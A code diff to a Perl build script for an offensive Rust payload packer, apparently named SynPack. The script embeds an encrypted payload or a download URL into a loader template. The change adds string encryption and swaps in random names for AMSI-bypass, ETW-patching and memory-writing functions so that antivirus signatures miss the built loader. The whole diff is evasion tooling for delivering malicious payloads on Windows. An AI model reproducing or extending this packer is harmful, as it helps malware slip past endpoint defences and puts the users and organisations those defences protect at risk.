@@ -190,6 +190,12 @@ $args = "String::from(\"$exe_args\")" if $exe_args;
 my $template = path(".\\src\\main.rs");
 my $replace = $template->slurp_utf8;
 
+## Replace various encryption keys
+my $litcrypt_key = gen_random_string(12);
+c_print("[+] Setting litcrypt key to: ", "$litcrypt_key\n", BRIGHT_GREEN);
+$replace =~ s/SYNPACK_ENCRYPT_KEY/$litcrypt_key/g;
+$ENV{'LITCRYPT_ENCRYPT_KEY'} = $litcrypt_key;
+
 $replace =~ s/SYNPACK_KEY/$hex_key/g;
 $replace =~ s/SYNPACK_IV/$hex_iv/g;
 $replace =~ s/SYNPACK_DATA/$hex_data/g if !$url;
@@ -201,6 +207,7 @@ if (!$encrypt) {
     $replace =~ s/decrypt_aes\(&mut bin_data\);//g;
 }
 
+## Replace functions and select variables with random names
 my $random_func_name = gen_random_string(12);
 $replace =~ s/decrypt_aes/$random_func_name/g if $encrypt;
 
@@ -209,6 +216,43 @@ $replace =~ s/time_delay/$random_func_name/g;
 
 $random_func_name = gen_random_string(11);
 $replace =~ s/mscoree_loader/$random_func_name/g;
+
+$random_func_name = gen_random_string(12);
+$replace =~ s/amsi_patch/$random_func_name/g;
+
+$random_func_name = gen_random_string(12);
+$replace =~ s/etw_patch/$random_func_name/g;
+
+$random_func_name = gen_random_string(12);
+$replace =~ s/func_addr/$random_func_name/g;
+
+$random_func_name = gen_random_string(12);
+$replace =~ s/kernel32_addr/$random_func_name/g;
+
+$random_func_name = gen_random_string(9);
+$replace =~ s/base_addr/$random_func_name/g;
+
+$random_func_name = gen_random_string(10);
+$replace =~ s/amsi_addr/$random_func_name/g;
+
+$random_func_name = gen_random_string(10);
+$replace =~ s/ntdll_addr/$random_func_name/g;
+
+$random_func_name = gen_random_string(11);
+$replace =~ s/amsi_scan_buffer/$random_func_name/g;
+
+$random_func_name = gen_random_string(14);
+$replace =~ s/ptr_nt_protect_virtual_memory/$random_func_name/g;
+
+$random_func_name = gen_random_string(14);
+$replace =~ s/ptr_nt_write_virtual_memory/$random_func_name/g;
+
+$random_func_name = gen_random_string(8);
+$replace =~ s/old_protect/$random_func_name/g;
+
+$random_func_name = gen_random_string(10);
+$replace =~ s/current_process/$random_func_name/g;
+
 
 if ($url) {
     $replace =~ s/SYNPACK_URL/$url/g;
@@ -227,10 +271,6 @@ $resp = <>;
 chomp $resp;
 purge_builds() if lc($resp) eq "y";
 
-
-my $litcrypt_key = gen_random_string(12);
-c_print("[+] Setting litcrypt key to: ", "$litcrypt_key\n", BRIGHT_GREEN);
-$ENV{'LITCRYPT_ENCRYPT_KEY'} = $litcrypt_key;
 
 c_print("[+] Compiling, this could take a while...\n");
 
